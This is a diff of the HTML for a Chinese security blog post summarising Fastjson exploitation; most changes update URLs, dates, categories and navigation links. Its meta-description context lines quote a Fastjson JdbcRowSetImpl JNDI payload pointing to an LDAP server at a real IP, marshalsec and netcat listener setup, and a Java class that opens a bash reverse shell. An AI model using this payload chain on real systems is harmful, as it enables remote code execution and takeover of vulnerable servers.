@@ -16,12 +16,12 @@
 {&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://47.119.161.84:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}
  在我们的云服务器上开启LDAP服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit 同目录开启http服务：python3 -m http.server 80 NC监听：nc -lvvp 8888 javac编译下面恶意类，将编译好的Exploit.class文件放在http同目录下  1 2 3 4 5 6 7 8 9 10 11 12  public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(&#34;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/8888 0&gt;&amp;1&#34;); }catch(Exception e){ e." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://example.com/fastjson/" /><meta property="og:image" content="https://example.com/v1.jpg"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-02-01T21:11:59+08:00" />
+<meta property="og:url" content="https://songzhiv.github.io/fastjson/" /><meta property="og:image" content="https://songzhiv.github.io/static/favicon.ico"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-01T23:11:59+08:00" />
 <meta property="article:modified_time" content="2022-02-18T21:11:59+08:00" />
 
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://example.com/v1.jpg"/>
+<meta name="twitter:image" content="https://songzhiv.github.io/static/favicon.ico"/>
 
 <meta name="twitter:title" content="Fastjson利用总结"/>
 <meta name="twitter:description" content="0X01 漏洞利用 探测fastjson 对于有错误回显的情况
@@ -34,9 +34,13 @@
 {&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://47.119.161.84:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}
  在我们的云服务器上开启LDAP服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit 同目录开启http服务：python3 -m http.server 80 NC监听：nc -lvvp 8888 javac编译下面恶意类，将编译好的Exploit.class文件放在http同目录下  1 2 3 4 5 6 7 8 9 10 11 12  public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(&#34;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/8888 0&gt;&amp;1&#34;); }catch(Exception e){ e."/>
 <meta name="application-name" content="柠檬k">
-<meta name="apple-mobile-web-app-title" content="柠檬k"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
-        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/fastjson/" /><link rel="next" href="https://example.com/config/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="柠檬k"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://songzhiv.github.io/fastjson/" /><link rel="prev" href="https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/" /><link rel="next" href="https://songzhiv.github.io/ntlm-relay/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -44,11 +48,11 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/example.com\/fastjson\/"
-        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1921 ,
-        "url": "https:\/\/example.com\/fastjson\/","datePublished": "2022-02-01T21:11:59+08:00","dateModified": "2022-02-18T21:11:59+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@id": "https:\/\/songzhiv.github.io\/fastjson\/"
+        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1921 ,
+        "url": "https:\/\/songzhiv.github.io\/fastjson\/","datePublished": "2022-02-01T23:11:59+08:00","dateModified": "2022-02-18T21:11:59+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
-            "name": "nmk","logo": "https:\/\/example.com\/images\/avatar.png"},"author": {
+            "name": "nmk","logo": "https:\/\/songzhiv.github.io\/images\/avatar.png"},"author": {
                 "@type": "Person",
                 "name": "nmk"
             },"description": ""
@@ -121,7 +125,7 @@
             <h2 class="toc-title">目录</h2>
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">Fastjson利用总结</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%85%B6%E4%BB%96/"><i class="far fa-folder fa-fw"></i>其他</a></span></div>
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-01">2022-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1921 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 10 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
@@ -1652,8 +1656,8 @@
         </section>
     </div>
 
-    <div class="post-nav">
-            <a href="/config/" class="next" rel="next" title="Config">Config<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/" class="prev" rel="prev" title="Adb卸载手机原装软件"><i class="fas fa-angle-left fa-fw"></i>Adb卸载手机原装软件</a>
+            <a href="/ntlm-relay/" class="next" rel="next" title="NTLM Relay">NTLM Relay<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
@@ -1667,5 +1671,5 @@
             </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                 <i class="fas fa-comment fa-fw"></i>
             </a>
-        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"data":{"id-1":"Nmk","id-2":"Nmk"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":" $","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":1000}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"data":{"id-1":"Nmk","id-2":"Nmk"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":" $","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":300}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
